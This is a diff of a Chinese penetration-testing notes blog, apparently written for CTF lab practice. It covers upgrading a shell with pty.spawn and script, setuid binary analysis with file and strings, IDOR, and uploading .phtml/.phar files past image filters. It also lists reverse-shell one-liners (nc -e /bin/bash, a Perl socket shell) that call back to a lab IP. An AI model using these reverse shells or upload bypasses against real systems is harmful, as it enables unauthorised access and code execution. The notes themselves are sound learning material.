+</code></pre><p>运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。</p>
+<p>也可以尝试下面的命令。</p>
+<pre tabindex="0"><code>script -qc /bin/bash /dev/null
+</code></pre><p>script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。</p>
+<h3 id="获得-shell-的一些-反弹-shell">获得 shell 的一些 反弹 shell</h3>
 <h4 id="linux">Linux</h4>
 <pre tabindex="0"><code>nc -e /bin/bash 10.10.10.5 4444
 
@@ -1339,9 +1502,14 @@ perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_ST
 <p>在拿到一个文件后可进行如下分析：</p>
 <p><img src="P1.png" alt="P1"></p>
 <p>file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 <code>not stripped</code> 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。</p>
+<p>来看这个例子：</p>
+<p><img src="P2.png" alt="P2"></p>
+<p><code>ELF -64-bit LSB</code> 表明该文件是 Linux 上常见的 ELF 格式可执行程序，架构为 64 位的 x86-64（也称 AMD64）。对反编译而言，这意味着再选职责反编译或调试工具时需要考虑 64 位指令集。<code>pie executable</code> 表明程序启用了位置无关可执行（Position Independent Executable，PIE）技术。这意味着程序每次加载到i内存中时，代码段的位置都是随机的，增加了逆向和漏洞利用的难度。反编译或漏洞的分析时必须考虑地址随机化因素。<code>dynamically linked</code> 表明程序采用动态链接，运行时依赖外部库（如标准 C 库 libc.so）。反编译过程中需要考虑并分析外部库函数的调用情况，可能需要加载外部符号或调试符号以便准确还原函数调用。<code>interpreter /lib64/ld-linux-x86-64.so.2</code> 提供了动态链接器路径，它指定程序执行时所使用的动态链接器的位置和名称。反编译和调试时，如出现共享库缺失问题或分析动态过程中的异常行为，可以通过这个链接器路径进行排查。<code>BuildID\[sha1\]=xxxxx</code> 时程序编译时生成的唯一构建标识（Build ID），可以用于明确程序版本、溯源编译信息或追踪程序来源。在逆向和取证中，可以通过此标志确定二进制文件是否发生过篡改、修改或重新编译。<code>for GNU/Linux 3.2.0</code> 指定了程序编译时所期待的 Linux 内核版本。在反编译和漏洞分析时，这有助于确定目标程序的运行环境，尤其当你考虑内核漏洞、兼容性或系统调用（syscall）行为时非常关键。</p>
+<p>最后的 <code>not stripped</code> 表明程序未进行符号剥离。这是对反编译而言非常利好的信息。因为这意味着程序的符号表、函数名、变量名、调试信息都被保留了下来，极大简化了反编译和逆向分析的难度，更容易直接恢复接近源代码的形式。、7</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ strings /bin/dartVader
-</code></pre><h3 id="将文件从-ssh-中拿出">将文件从 ssh 中拿出</h3>
+</code></pre><p>strings 默认情况下会从文件中连续提取长度大于等于 4 的字符（可通过 -n 参数调整），且属于 ASCII 可打印字符序列，其他非打印字符被忽略。在渗透测试中， string 的使用场景及其广泛，例如：渗透测试时拿到了一个可疑的 ELF 文件，运行 strings 可以快速发现硬编码的密码、域名、文件路径等敏感信息，帮助快速判断下一步攻击路径；对未知为文件快速扫描，也可以快速提取潜在可读信息，提升分析效率。</p>
+<h3 id="将文件从-ssh-中拿出">将文件从 ssh 中拿出</h3>
 <p>以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .
@@ -1349,6 +1517,10 @@ perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_ST
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -s http://10.10.10.45/secret | trans -b :zh
 </code></pre><p>trans（translate-shell）是很不错的命令行翻译工具。</p>
+<h3 id="idor-不安全直接对象引用">IDOR 不安全直接对象引用</h3>
+<p>IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是一种常见的访问控制漏洞，主要出现在 Web 应用请求的资源未进行有效的权限验证和限制的情况下。具体来说，应用程序通过用户提交的参数（如用户ID、文件名、订单号等）直接引用内部对象，却未验证当前用户是否拥有访问这些对象的权限。这种情况下，攻击者可以通过修改请求的参数值（例如 ID 号）直接访问或操作本不该被访问到的敏感信息或资源，从而实现越权访问。例如，在一个用户个人信息页面中，如果 URL 参数形如 user?id=1，攻击者只需要修改 id 值即可查看其他用户的数据。当开发者未对资源引用和权限做严格验证时，IDOR 漏洞便会产生，攻击者通过简单篡改请求参数即可实现攻击。</p>
+<h3 id="关于文件上传">关于文件上传</h3>
+<p>有些表单原本只可以上传 jpg、git、png 等图片格式文件，为什么最终却可以上传 .phtml 和 .phar 格式文件呢？因为 .phtml 和 .phar 两种文件格式比较特殊，.phtml 是一种 PHP 常规拓展名，早期较为常见，现在虽然使用较少但依旧默认会被 PHP 引擎解析，这使得攻击者能够通过上传该格式的文件直接执行恶意 PHP 代码。而 .phar 更加特殊，它本质上是 PHP 的归档文件格式（PHP Archive），也可以执行。</p>
 ]]></content></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
 &lt;h2 id="可能使用到的-cewl-及-john-命令及解释"&gt;可能使用到的 Cewl 及 john 命令及解释&lt;/h2&gt;
 &lt;h3 id="cewl-语句及其解释"&gt;Cewl 语句及其解释&lt;/h3&gt;
